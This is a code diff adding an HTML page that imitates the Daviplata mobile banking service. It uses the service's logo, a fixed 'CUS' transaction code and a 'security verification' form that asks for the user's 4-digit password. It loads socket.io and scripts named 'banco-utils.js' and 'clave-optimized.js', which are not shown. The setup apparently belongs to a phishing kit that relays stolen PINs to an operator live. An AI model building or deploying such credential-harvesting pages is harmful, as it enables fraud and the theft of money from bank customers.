@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Daviplata - Ingrese su clave</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <img src="img/logo-daviplata.svg" alt="Daviplata Logo" class="logo">
+            <div class="header-info">
+                <p class="date" id="currentDate"></p>
+                <p class="code">Código único CUS: 1986688397</p>
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <div class="form-container">
+                <h1 class="title">Verificación de seguridad</h1>
+                <p class="subtitle">Ingrese su clave de Daviplata</p>
+
+                <h2 class="form-title">Clave de seguridad</h2>
+
+                <form class="form" id="claveForm">
+                    <div class="input-group">
+                        <input 
+                            type="password" 
+                            id="claveInput" 
+                            class="form-input" 
+                            maxlength="4"
+                            required
+                        >
+                    </div>
+
+                    <div class="button-group">
+                        <button type="button" class="btn btn-cancel">Cancelar</button>
+                        <button type="button" class="btn btn-continue" id="btnContinue" disabled>Continuar</button>
+                    </div>
+                </form>
+            </div>
+        </main>
+    </div>
+
+    <!-- Overlay de carga -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <img src="img/loader.gif" alt="Cargando..." class="loader">
+            <p class="loading-text">Verificando información...</p>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/banco-utils.js"></script>
+    <script src="clave-optimized.js"></script>
+</body>
+</html>
